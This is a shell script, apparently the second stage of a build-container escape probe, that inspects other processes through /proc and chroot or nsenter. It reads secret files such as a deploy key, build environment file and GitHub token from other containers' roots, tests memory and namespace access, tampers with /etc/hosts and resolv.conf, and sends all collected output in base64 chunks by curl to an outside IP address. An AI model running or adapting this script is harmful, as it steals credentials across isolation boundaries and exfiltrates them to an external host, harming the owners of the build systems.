#!/bin/sh
# w16-buildesc stage2: /proc/<other-pid>/ access matrix (builder vs podman vs buildah)
B="http://169.58.237.50/w16esc-e328516f"
OUT=/tmp/o16b
: > $OUT
L(){ echo "$@" >> $OUT 2>&1; }
S(){ L ""; L "#### $1"; }

S idcap
L "id=$(id 2>&1) selfns=$(readlink /proc/self/ns/user 2>&1)/$(readlink /proc/self/ns/mnt 2>&1)"

S procpid_matrix
for p in 1 26 105 118 346 360; do
  L "== pid $p : $(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null | cut -c1-90)"
  L "   Uid: $(awk '/^Uid/{print $2"/"$3"/"$4"/"$5}' /proc/$p/status 2>&1 | tr -d '\n')  Dumpable: $(awk '/^CoreDumping|^Dumpable/{print $2}' /proc/$p/status 2>&1 | tr -d '\n')"
  L "   ns_user=$(readlink /proc/$p/ns/user 2>&1) ns_mnt=$(readlink /proc/$p/ns/mnt 2>&1) ns_pid=$(readlink /proc/$p/ns/pid 2>&1)"
  L "   root=$(readlink /proc/$p/root 2>&1) cwd=$(readlink /proc/$p/cwd 2>&1) exe=$(readlink /proc/$p/exe 2>&1)"
  L "   root_ls=$(ls -la /proc/$p/root/ 2>&1 | head -10 | tr '\n' '|' | cut -c1-400)"
  L "   environ=$(head -c 400 /proc/$p/environ 2>&1 | tr '\0' ' ' | tr '\n' '|' | cut -c1-400)"
  L "   maps=$(head -c 200 /proc/$p/maps 2>&1 | tr '\n' '|' | cut -c1-250)"
  L "   fd=$(ls -l /proc/$p/fd/ 2>&1 | head -14 | tr '\n' '|' | cut -c1-600)"
  L "   ROOTsecrets=$(ls -la /proc/$p/root/secrets/ 2>&1 | head -8 | tr '\n' '|' | cut -c1-300)"
  L "   deploy_key=$(head -c 150 /proc/$p/root/secrets/deploy_key 2>&1 | tr '\n' '|')"
  L "   build.env=$(head -c 300 /proc/$p/root/secrets/build.env 2>&1 | tr '\n' '|')"
  L "   github_token=$(head -c 60 /proc/$p/root/secrets/github_token 2>&1)"
  L "   rootbuild=$(ls -la /proc/$p/root/build/ 2>&1 | head -6 | tr '\n' '|' | cut -c1-300)"
  L "   rootbuildinput=$(ls -la /proc/$p/root/build/input/ 2>&1 | head -6 | tr '\n' '|' | cut -c1-300)"
  L "   rootalloc=$(ls -la /proc/$p/root/alloc/ 2>&1 | head -6 | tr '\n' '|' | cut -c1-300)"
  L "   rootpodmanhome=$(ls -la /proc/$p/root/home/ 2>&1 | head -8 | tr '\n' '|' | cut -c1-300)"
done

S chroot_via_procpid
for p in 26 346 360; do
  L "chroot /proc/$p/root ls /secrets: $(chroot /proc/$p/root /bin/ls -la /secrets 2>&1 | head -8 | tr '\n' '|' | cut -c1-300)"
  L "chroot /proc/$p/root ls /: $(chroot /proc/$p/root /bin/ls / 2>&1 | head -14 | tr '\n' '|' | cut -c1-300)"
done
for p in 26 346 360; do
  L "nsenter -t $p -m ls /: $(nsenter -t $p -m -- ls / 2>&1 | head -8 | tr '\n' '|' | cut -c1-300)"
  L "nsenter -t $p -m cat deploy: $(nsenter -t $p -m -- head -c 120 /secrets/deploy_key 2>&1 | tr '\n' '|' | cut -c1-200)"
done

S pid1_mountinfo
L "-- head80: $(head -80 /proc/1/mountinfo 2>&1 | cut -c1-260 | tr '\n' '@')"

S pid26_mountinfo
L "-- count=$(wc -l < /proc/26/mountinfo 2>/dev/null) head40: $(head -40 /proc/26/mountinfo 2>&1 | cut -c1-200 | tr '\n' '@')"

S mem_maps
L "mem_read_1byte: $(dd if=/proc/1/mem bs=1 count=1 2>&1 | head -c 120)"
L "maps_read: $(head -3 /proc/1/maps 2>&1 | cut -c1-200 | tr '\n' '|')"
L "environ_read: $(cat /proc/1/environ 2>&1 | head -c 200 | tr '\0' ' ')"
L "attr_current: $(cat /proc/1/attr/current 2>&1)"
L "self_attr: $(cat /proc/self/attr/current 2>&1)"
L "attr_exec1: $(ls -la /proc/1/attr/ 2>&1 | tr '\n' '|')"
L "loginuid: $(cat /proc/1/loginuid 2>&1) self=$(cat /proc/self/loginuid 2>&1)"

S namespaces_sysinfo
L "unshare_Urm: $(unshare -Urm -- sh -c 'id; grep CapEff /proc/self/status' 2>&1 | tr '\n' '|' | cut -c1-300)"
L "overlay_userns_mount: $(unshare -Urm -- sh -c 'mkdir -p /tmp/a /tmp/b /tmp/c /tmp/m && mount -t tmpfs none /tmp/m && echo TMPFS_MOUNT_OK; mount -t overlay ovl -o lowerdir=/tmp/a,upperdir=/tmp/b,workdir=/tmp/c /tmp/m2 2>&1 | head -2' 2>&1 | tr '\n' '|' | cut -c1-300)"
L "sysctl: ptrace_scope=$(cat /proc/sys/kernel/yama/ptrace_scope 2>&1) userns_clone=$(cat /proc/sys/kernel/unprivileged_userns_clone 2>&1)"
L "kernel_unpriv_userns: $(sysctl kernel.unprivileged_userns_clone 2>&1 | head -2)"
L "self_mounts_all: $(cat /proc/self/mounts 2>&1 | cut -c1-170 | tr '\n' '@')"
L "self_mountinfo_sources: $(grep -oE '(source|fstype)\s*=\s*\S+' /proc/self/mountinfo 2>/dev/null | head -5)"

S etc_hosts_writable
L "etc_hosts: $(cat /etc/hosts 2>&1 | head -2 | tr '\n' '|')"
L "etc_hosts_write: $( (echo '#w16' >> /etc/hosts && echo WROTE_ETC_HOSTS) 2>&1)"
L "resolv_write: $( (echo 'nameserver 1.1.1.1' >> /etc/resolv.conf && echo WROTE_RESOLV) 2>&1)"
L "hostname_write: $( (echo w16 > /etc/hostname && echo WROTE_HOSTNAME) 2>&1)"

cat $OUT
b64=$(base64 -w0 $OUT 2>/dev/null | tr '+/' '-_')
i=0
while [ -n "$b64" ]; do
  chunk=$(printf '%s' "$b64" | cut -c1-380); b64=$(printf '%s' "$b64" | cut -c381-)
  curl -s -m 5 "$B/s2c$i-$chunk" >/dev/null 2>&1
  i=$((i+1)); [ $i -gt 400 ] && break
done
echo "W16S2 DONE chunks=$i"
exit 0
